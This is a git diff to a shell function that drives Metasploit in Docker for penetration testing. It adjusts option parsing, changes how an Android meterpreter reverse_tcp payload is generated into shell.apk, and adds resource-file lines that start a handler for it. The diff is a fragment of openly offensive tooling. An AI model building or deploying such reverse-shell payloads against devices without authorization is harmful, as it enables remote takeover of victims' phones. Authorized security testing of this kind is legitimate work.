@@ -3,7 +3,7 @@ function msf_start() {
 tmuxwindowname=$(tmux display-message -p '#W')
 tmux rename-window -t${TMUX_PANE} "msf"
 tmuxwindownamebuild=$(tmux display-message -p '#W')
-while getopts d:n:p:huwlo option
+while getopts d:n:p:huawlo option
 do
 	case "${option}" in
 		d)
@@ -74,7 +74,6 @@ if [ -n "$andpay" ]; then
 		-p "android/meterpreter/reverse_tcp" \
 		"LHOST=$hostip" \
 		"LPORT=$exploitport" \
-		-f "apk" \
 		-o "/pentest/Desktop/shell.apk"
 fi
 if [ -n "$winpay" ]; then
@@ -120,6 +119,10 @@ docker exec -t $msf /bin/bash \
 	-c "echo set lport $exploitport >> /root/.msf4/osxpay.rc"
 docker exec -t $msf /bin/bash \
 	-c "echo exploit -j >> /root/.msf4/osxpay.rc"
+docker exec -t $msf /bin/bash \
+	-c "echo set lport $exploitport >> /root/.msf4/andpay.rc"
+docker exec -t $msf /bin/bash \
+	-c "echo exploit -j >> /root/.msf4/andpay.rc"
 docker exec -t $msf /bin/bash \
 	-c "echo clear >> /root/.msf4/msfconsole.rc"
 docker exec -t $msf /bin/bash \
